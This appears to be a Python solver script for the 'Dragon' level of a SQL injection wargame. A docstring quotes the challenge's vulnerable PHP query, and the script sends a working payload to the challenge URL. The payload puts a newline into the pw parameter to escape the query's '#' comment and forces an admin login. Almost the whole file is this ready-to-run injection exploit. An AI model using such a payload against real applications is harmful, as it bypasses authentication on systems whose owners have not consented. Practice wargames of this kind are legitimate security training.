#!/usr/bin/env python3
import los


def main():
    '''
    Dragon 20

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    $query = "select id from prob_dragon where id='guest'# and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    if($result['id'] == 'admin') solve("dragon");
    '''

    url = "https://los.rubiya.kr/chall/dragon_51996aa769df79afbf79eb4d66dbcef6.php"
    cook = los.check_cookies(url)

    param = dict(pw="'\n&&0||id='admin")

    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('DRAGON Clear!')


if __name__ == '__main__':
    main()

